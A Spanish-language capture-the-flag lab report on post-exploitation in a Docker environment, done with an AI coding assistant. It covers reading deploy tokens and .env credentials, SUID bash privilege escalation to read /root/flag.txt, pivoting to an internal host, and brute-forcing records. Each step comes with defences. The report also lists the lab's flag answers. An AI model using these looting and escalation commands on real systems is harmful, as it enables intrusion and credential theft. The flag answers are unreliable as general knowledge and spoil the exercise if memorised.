# Informe — Laboratorio 08 · Post-explotación y automatización

**Grupo:** 09
**Integrantes:** FranMossello — FranMossello
**Fecha:** 2026-11-20

---

## 0. Declaración de uso de IA

Se usó un asistente de IA (Claude Code) para levantar el entorno Docker,
ejecutar los comandos dentro del host comprometido, completar
`recolector.py` y redactar el informe. **Todas las acciones de recon, loot,
escalada de privilegios y pivoting se ejecutaron realmente dentro del
contenedor `cyberlab-phantomcorp` como el usuario `operador`**, no se leyeron
las flags del código fuente del lab. El script `recolector.py` se corrió de
punta a punta contra `phantomcorp-db` y encontró el legajo real (`id=187`).

---

## 1. Flags capturadas

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 08 COMPLETO!
```

---

## 2. Informe de post-explotación

| Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
|---|---|---|---|---|
| Recon del host | Enumeré el filesystem buscando archivos fuera de lugar en `/opt` | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | Nota de despliegue con `deploy_token=FLAG{post_situational_awareness}` | Los artefactos de deploy (notas, tokens) no deben quedar en el filesystem del servidor en texto plano; van en un gestor de secretos o se borran post-deploy |
| Loot | Busqué configuración de la app con credenciales | `cat /var/www/.env` | `.env` con `DB_PASS=Ph@ntom-DB-2024` y `APP_SECRET=FLAG{loot_credentials_found}` en texto plano | Nunca commitear/dejar `.env` legible por cualquier usuario del sistema (`chmod 600`, propietario de la app); usar un vault o variables de entorno inyectadas en runtime, no un archivo persistente |
| Privesc (SUID) | Enumeré binarios con bit SUID y encontré una copia de `bash` fuera de lo estándar | `find / -perm -4000 -type f` → `/usr/local/bin/system-check` ; luego `/usr/local/bin/system-check -p -c "cat /root/flag.txt"` | `FLAG{privesc_suid_root}` (leído con permisos de `root`, siendo `operador`) | Jamás dar SUID a un intérprete de shell (ni copias); auditar binarios SUID no estándar con `find / -perm -4000` periódicamente; principio de mínimo privilegio |
| Pivoting | Desde el host comprometido alcancé la red interna que desde afuera no se ve | `curl http://phantomcorp-db/` | `{"pivot": "FLAG{pivot_internal_host}", ...}` | Segmentación de red real (no solo "no lo expongo"): el host web no debería poder iniciar conexiones arbitrarias hacia la DB más allá de lo que su rol necesita (firewall interno, reglas de egress) |

---

## 3. Automatización

`src/recolector.py` completado (ver carpeta de esta entrega). Implementa
`buscar_flag()`: recorre los 250 legajos con `consultar_legajo()`, detecta el
que trae una clave extra distinta de `{id, nombre, area}` cuyo valor empieza
con `FLAG{`, y corta apenas lo encuentra (no sigue iterando de gusto).

Salida real, corrida dentro del host comprometido:

```
$ python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
[*] Enumerando legajos 1..250 en http://phantomcorp-db
[+] Flag en el legajo id=187: FLAG{automation_pays_off}
```

---

## 4. Preguntas de análisis

**P1 — SUID y el flag `-p`.**
Un binario con el bit **SUID** activo no se ejecuta con los permisos de quien
lo invoca, sino con los permisos de su **dueño** — en este caso `root`, porque
`/usr/local/bin/system-check` es una copia de `bash` con `chmod 4755` y
propietario `root:root`. Es peligroso porque convierte "puedo ejecutar este
archivo" en "puedo correr código con privilegios de root", sin que haga falta
ninguna otra falla. El flag `-p` de bash le dice al shell que **no abandone**
los privilegios efectivos que trae al arrancar (por defecto, si detecta que
`uid` real ≠ `uid` efectivo, bash los baja por seguridad). Con `-p`, el bash
que arrancó como root por el SUID **se queda siendo root** en vez de
degradarse al usuario que lo invocó — es justo lo que permitió leer
`/root/flag.txt`, un archivo con `chmod 600` propiedad de `root` que
`operador` no podría leer de otra forma.

**P2 — el pivoting (por qué el atacante no llegaba y vos sí).**
`phantomcorp-db` vive en una red Docker interna (`internalnet`) separada de la
red donde está la consola del atacante. La consola del atacante **no tiene
ninguna interfaz conectada a esa red interna**: para ella, `phantomcorp-db` ni
existe en el DNS ni es enrutable. El host `phantomcorp` (donde caímos con el
RCE del Lab 07), en cambio, **sí** tiene una pata en esa red interna porque es
el servidor de aplicación que necesita hablar con su base de datos. Al
comprometerlo, heredamos esa conectividad: desde adentro de `phantomcorp`
corrimos `curl http://phantomcorp-db/` y respondió, porque **desde ese punto
de la red, el destino es alcanzable**. Eso es pivoting: usar un host
comprometido como punto de salto hacia una red que, desde el punto de partida
original, era invisible.

**P3 — cómo evitar secretos en `.env`/`.bash_history`.**
Dos prácticas concretas: (1) **gestión de secretos centralizada** — en vez de
un archivo `.env` con credenciales en texto plano en el filesystem del
servidor, usar un vault (HashiCorp Vault, AWS Secrets Manager, etc.) o
variables de entorno inyectadas por el orquestador en el momento del arranque
del proceso, nunca persistidas en disco; y (2) **disciplina de shell** —
configurar `HISTCONTROL`/`HISTFILE` para no grabar comandos con contraseñas
en texto, o directamente no tipear credenciales en la línea de comandos (usar
variables de entorno, flags de archivo, o prompts interactivos que no quedan
en el historial). Ambas apuntan a la misma idea: minimizar el tiempo y los
lugares donde un secreto existe en texto plano y legible.

**P4 — qué decidiste vos que el script no decide solo.**
El script ejecuta exactamente lo que le dijimos, ni un bit más: **nosotros**
decidimos (a) el rango a recorrer (1 a 250, porque sabíamos por el enunciado
que había 250 legajos — el script no lo "sabe", lo recibe como parámetro),
(b) **qué cuenta como "tiene el flag"** (una clave extra con valor que
empieza con `FLAG{`, una heurística que diseñamos nosotros mirando la
respuesta JSON a mano primero), y (c) **cuándo cortar** (apenas se encuentra
uno, no seguir "por si hay más" — una decisión de alcance). El script no
tiene criterio propio: ejecuta la lógica exacta que le dimos, sobre el rango
exacto que le dimos. Esa separación —humano decide el "qué" y el "cuándo
parar", máquina ejecuta la repetición— es literalmente la antesala del Lab 09:
un agente de IA reemplaza parte de esas decisiones (puede inferir el patrón
"clave distinta" sin que se lo programemos a mano), pero sigue necesitando
que el humano le ponga límites (el guardrail de alcance).

**P5 — defensa para SUID y para pivoting.**
- **SUID:** auditoría periódica con `find / -perm -4000 -type f` contra una
  lista blanca conocida de binarios que *deben* tener SUID (como `passwd`,
  `su`, `mount`); cualquier binario SUID que no esté en esa lista blanca es
  una alerta inmediata. Nunca dar SUID a un intérprete (`bash`, `python`,
  `perl`) ni a una copia de uno.
- **Pivoting:** segmentación de red con **egress filtering** real — el host
  `phantomcorp` debería poder hablar con `phantomcorp-db` solo por el puerto
  y protocolo que su aplicación necesita (no acceso de red irrestricto), y
  un firewall/NACL debería bloquear cualquier otro tráfico saliente desde ese
  host hacia la red interna. Así, aunque el host web se comprometa, el radio
  de daño del pivot queda acotado a lo estrictamente necesario.

---

## 5. Bitácora de comandos

```bash
# Preparación
make setup
./ctf lab 08
make shell-victima          # entra como 'operador' al host comprometido

# R1 — recon del filesystem
id ; whoami ; hostname
cat /opt/phantom-deploy/DEPLOY_NOTES.txt
# -> deploy_token=FLAG{post_situational_awareness}

# R2 — loot de credenciales
cat /var/www/.env
# -> APP_SECRET=FLAG{loot_credentials_found}

# R3 — escalada de privilegios (SUID)
find / -perm -4000 -type f 2>/dev/null
# -> /usr/local/bin/system-check (copia SUID de bash, no estándar)
/usr/local/bin/system-check -p -c "cat /root/flag.txt"
# -> FLAG{privesc_suid_root}

# R4 — pivoting a la red interna
curl -s http://phantomcorp-db/
# -> {"pivot": "FLAG{pivot_internal_host}", ...}

# R5 — automatización (ver también src/recolector.py)
python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
# -> [+] Flag en el legajo id=187: FLAG{automation_pays_off}

# Entrega (desde la raíz del repo, fuera del host víctima)
./ctf submit 08 R1 'FLAG{post_situational_awareness}'
./ctf submit 08 R2 'FLAG{loot_credentials_found}'
./ctf submit 08 R3 'FLAG{privesc_suid_root}'
./ctf submit 08 R4 'FLAG{pivot_internal_host}'
./ctf submit 08 R5 'FLAG{automation_pays_off}'
./ctf status 08
```
